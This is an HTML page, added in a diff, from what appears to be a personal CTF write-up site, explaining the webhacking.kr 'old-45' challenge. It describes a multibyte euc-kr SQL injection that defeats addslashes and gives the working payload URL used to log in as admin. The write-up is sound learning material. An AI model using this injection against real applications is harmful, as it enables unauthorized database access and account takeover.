@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>old-45 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="old-45" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/old-45.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/old-45.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="old-45" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"old-45","url":"http://localhost:4000/CTF_writeups/webhacking.kr/old-45.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="webhacking-old-45-solution">Webhacking old-45 Solution</h1>
+
+<p>another sql injection.
+here we use insert %bb and then, after the addslashes put <code class="language-plaintext highlighter-rouge">\</code> before the <code class="language-plaintext highlighter-rouge">'</code>, it’ll take the %bb + <code class="language-plaintext highlighter-rouge">\</code> and encode in <code class="language-plaintext highlighter-rouge">euc-kr</code> format.</p>
+
+<p>this is the payload i gave:</p>
+
+<p>here we want to insert this: <code class="language-plaintext highlighter-rouge">id=%aa%27%20or%20id%20like%200x61646d696e'</code>, this is like: <code class="language-plaintext highlighter-rouge">' or id like admin</code>
+this is the query i used in the http get</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://webhacking.kr/challenge/web-22/?id=%aa%27%20or%20id%20like%200x61646d696e--%20&amp;pw=guest
+</code></pre></div></div>
+
+      </section>
+    </div>
+  </body>
+</html>
